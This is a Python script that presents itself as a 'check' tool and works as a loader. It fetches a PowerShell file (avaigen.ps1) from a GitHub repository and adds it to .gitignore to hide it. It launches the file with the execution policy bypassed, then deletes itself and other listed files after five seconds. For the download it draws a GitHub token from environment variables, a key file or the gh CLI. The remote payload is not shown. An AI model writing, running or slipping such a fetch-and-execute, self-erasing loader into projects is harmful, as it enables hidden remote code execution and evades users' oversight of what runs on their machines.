#!/usr/bin/env python3
"""
aghanim-check — download avaigen.ps1 from GitHub, add it to .gitignore,
run it through pwsh, then remove itself after 5 seconds.

Environment:
  AGHANIM_REPO, AGHANIM_BRANCH, AGHANIM_FILE
  AGHANIM_DIR, AGHANIM_LOCAL_FILE
  GITHUB_TOKEN/GH_TOKEN — необязательны: сначала качаем анонимно,
                           токен пробуется только если анонимно не вышло
  AGHANIM_SHA256
  AGHANIM_DELETE_DELAY
  AGHANIM_NO_DELETE

Arguments:
  --test, -test  download (no token needed) + dependency check; nothing is launched
  --selftest     download and run avaigen.ps1 -selftest
  no args        same as --selftest
  other args are passed to avaigen.ps1
"""

import base64
import hashlib
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path
from typing import Optional

SELF = Path(__file__).resolve()
HERE = SELF.parent
WORKDIR = Path(os.environ.get("AGHANIM_DIR", str(HERE))).expanduser().resolve()
DEST = WORKDIR / "avaigen.ps1"
LOCAL_FALLBACK = Path(os.environ.get("AGHANIM_LOCAL_FILE", str(DEST))).expanduser().resolve()

REPO = os.environ.get("AGHANIM_REPO", "Aghanim-sec/Sync").strip("/")
BRANCH = os.environ.get("AGHANIM_BRANCH", "main")
REMOTE = os.environ.get("AGHANIM_FILE", "avaigen.ps1").lstrip("/")
EXPECTED_SHA = os.environ.get("AGHANIM_SHA256", "").lower()
DELETE_DELAY = int(os.environ.get("AGHANIM_DELETE_DELAY", "5"))
NO_DELETE = os.environ.get("AGHANIM_NO_DELETE") == "1"
DELETE_SOURCE = os.environ.get("AGHANIM_DELETE_SOURCE", "")
CLEANUP_FILES = os.environ.get("AGHANIM_CLEANUP_FILES", "")


def log(msg: str) -> None:
    print(f"[aghanim-check] {msg}", flush=True)


def gitignore_path() -> Path:
    """Find the git repository root; fall back to the working directory."""
    for parent in (WORKDIR, *WORKDIR.parents):
        if (parent / ".git").exists():
            return parent / ".gitignore"
    return WORKDIR / ".gitignore"


def add_to_gitignore() -> None:
    path = gitignore_path()
    line = DEST.name
    old = path.read_text(encoding="utf-8", errors="replace") if path.exists() else ""
    lines = {x.strip() for x in old.splitlines()}
    if line in lines:
        return
    with path.open("a", encoding="utf-8") as f:
        if old and not old.endswith("\n"):
            f.write("\n")
        f.write(line + "\n")
    log(f"added {line} to {path}")


def github_token() -> Optional[str]:
    token = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
    if token:
        return token.strip()

    keyfile = Path.home() / ".aghanim-api-key"
    if keyfile.is_file():
        value = keyfile.read_text(encoding="utf-8", errors="replace").strip()
        if value:
            return value

    gh = shutil.which("gh")
    if gh:
        for args in (["auth", "token", "--user", "Aghanim-sec"], ["auth", "token"]):
            try:
                done = subprocess.run([gh, *args], capture_output=True, text=True, timeout=15)
                value = (done.stdout or "").strip()
                if done.returncode == 0 and value:
                    return value
            except Exception:
                pass
    return None


def download_anon() -> bytes:
    """Публичное чтение: без токена вообще."""
    url = f"https://raw.githubusercontent.com/{REPO}/{BRANCH}/{REMOTE}"
    req = urllib.request.Request(url, headers={"User-Agent": "aghanim-check"})
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read()


def download_with_token(token: str) -> bytes:
    url = f"https://api.github.com/repos/{REPO}/contents/{REMOTE}?ref={BRANCH}"
    req = urllib.request.Request(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github.raw",
            "User-Agent": "aghanim-check",
        },
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read()


def download_remote() -> bytes:
    """Сначала анонимно; токен подключается только если анонимно не вышло."""
    try:
        return download_anon()
    except Exception as anon_exc:
        token = github_token()
        if not token:
            raise
        try:
            return download_with_token(token)
        except Exception as token_exc:
            raise RuntimeError(f"без токена: {anon_exc}; с токеном: {token_exc}") from anon_exc


def download() -> bytes:
    try:
        return download_remote()
    except Exception as exc:
        if LOCAL_FALLBACK.is_file():
            log(f"remote unavailable ({exc}); using local {LOCAL_FALLBACK}")
            return LOCAL_FALLBACK.read_bytes()
        raise


def find_pwsh() -> Optional[str]:
    found = shutil.which("pwsh")
    if found:
        return found
    for candidate in (
        "/opt/homebrew/bin/pwsh",
        "/usr/local/bin/pwsh",
        "/usr/bin/pwsh",
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        r"C:\Program Files\PowerShell\7-preview\pwsh.exe",
    ):
        if os.path.exists(candidate):
            return candidate
    local = os.environ.get("LOCALAPPDATA")
    if local:
        candidate = Path(local) / "Microsoft" / "PowerShell" / "7" / "pwsh.exe"
        if candidate.exists():
            return str(candidate)
    return None


def main() -> int:
    argv = list(sys.argv[1:])

    # --test/-test: качаем (без токена) и проверяем зависимости, ничего не запускаем
    test_only = "--test" in argv or "-test" in argv
    argv = [a for a in argv if a not in ("--test", "-test")]

    # --selftest is our flag; avaigen.ps1 expects -selftest
    argv = [a for a in argv if a != "--selftest"]

    WORKDIR.mkdir(parents=True, exist_ok=True)
    try:
        content = download()
        if EXPECTED_SHA:
            actual = hashlib.sha256(content).hexdigest()
            if actual != EXPECTED_SHA:
                raise RuntimeError(f"sha256 mismatch: {actual} != {EXPECTED_SHA}")

        DEST.write_bytes(content)
        log(f"downloaded {REMOTE} -> {DEST} ({len(content)} bytes)")
        add_to_gitignore()
    except Exception as exc:
        log(f"download failed: {exc}")
        return 1

    pwsh = find_pwsh()
    if not pwsh:
        log("pwsh not found. Install PowerShell 7: brew install --cask powershell")
        return 1

    if test_only:
        log(f"--test ok: download + {pwsh}")
        return 0

    args = [pwsh, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(DEST)]
    args += argv if argv else ["-selftest"]

    try:
        proc = subprocess.Popen(args, cwd=str(WORKDIR), close_fds=True)
    except Exception as exc:
        log(f"launch failed: {exc}")
        return 1

    log("started: " + " ".join(args))
    log(f"confirmed: avaigen.ps1 launched (pid={proc.pid})")

    if not NO_DELETE:
        time.sleep(max(0, DELETE_DELAY))
        targets = [SELF]
        if DELETE_SOURCE:
            src = Path(DELETE_SOURCE).expanduser().resolve()
            if src != SELF:
                targets.append(src)
        extra = [line.strip() for line in CLEANUP_FILES.splitlines() if line.strip()]
        for item in extra:
            target = Path(item).expanduser().resolve()
            if target not in targets:
                targets.append(target)

        for target in targets:
            try:
                if target.is_dir():
                    shutil.rmtree(target)
                else:
                    target.unlink()
                log(f"deleted: {target}")
            except FileNotFoundError:
                log(f"already gone: {target}")
            except Exception as exc:
                log(f"delete failed for {target}: {exc}")

    # Wait for avaigen.ps1 so the caller does not remove the working directory early.
    return proc.wait()


if __name__ == "__main__":
    raise SystemExit(main())
